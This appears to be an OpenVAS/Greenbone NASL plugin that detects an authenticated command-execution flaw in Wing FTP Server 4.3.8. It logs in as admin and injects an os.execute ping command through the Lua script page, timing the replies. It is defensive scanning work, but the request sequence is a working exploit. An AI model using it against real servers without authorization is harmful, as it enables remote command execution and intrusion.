# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wftpserver:wing_ftp_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804766");
  script_version("2024-02-26T05:06:11+0000");
  script_tag(name:"cvss_base", value:"8.2");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:P");
  script_tag(name:"last_modification", value:"2024-02-26 05:06:11 +0000 (Mon, 26 Feb 2024)");
  script_tag(name:"creation_date", value:"2014-09-12 11:42:19 +0530 (Fri, 12 Sep 2014)");
  script_cve_id("CVE-2015-4107");
  script_name("Wing FTP Server <= 4.3.8 Authenticated Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wing_ftp_server_consolidation.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/www", 5466);
  script_mandatory_keys("wing_ftp/server/http/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34517");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/128045");

  script_tag(name:"summary", value:"Wing FTP Server is prone to an authenticated command execution
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the
  responses.");

  script_tag(name:"insight", value:"Flaw is due to the os.execute() function in the embedded LUA
  interpreter in the admin web interface is not properly handling specially crafted HTTP POST
  requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow an authenticated remote
  attacker to execute arbitrary commands.");

  script_tag(name:"affected", value:"Wing FTP Server version 4.3.8 is known to be affected. Other
  versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");
include("ftp_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

kb_creds = ftp_get_kb_creds();
FTPuser = kb_creds["login"];
FTPpass = kb_creds["pass"];

host = http_host_name(port:port);

res = http_get_cache(item:dir + "/admin_login.html", port:port);

if(">Wing FTP Server Administrator<" >< res) {

  url = dir + "/admin_loginok.html";

  postData = "username=" + FTPuser + "&password=" + FTPpass +
             "&username_val=" + FTPuser + "&password_val=" +
             FTPpass + "&submit_btn=%2bLogin%2b";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               "\r\n", postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req);

  cookie = eregmatch(pattern:"[Ss]et-[Cc]ookie\s*:\s*UIDADMIN=([0-9a-z]+);", string:res);
  if(!cookie[1])
    exit(0);

  url = dir + "/admin_lua_script.html";

  if(os_host_runs("Windows") == "yes") {
    ping = "ping -n ";
    wait_extra_sec = 5;
  } else {
    ping = "ping -c ";
    wait_extra_sec = 7;
  }

  sleep = make_list(3, 5, 7);

  foreach sec(sleep) {

    postData = "command=os.execute('cmd /c " + ping + sec + " 127.0.0.1')";

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Cookie: UIDADMIN=", cookie[1], "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData, "\r\n");

    start = unixtime();
    res = http_keepalive_send_recv(port:port, data:req);
    stop = unixtime();

    time_taken = stop - start;
    time_taken = time_taken + 1;

    if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec))
      exit(0);
  }
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
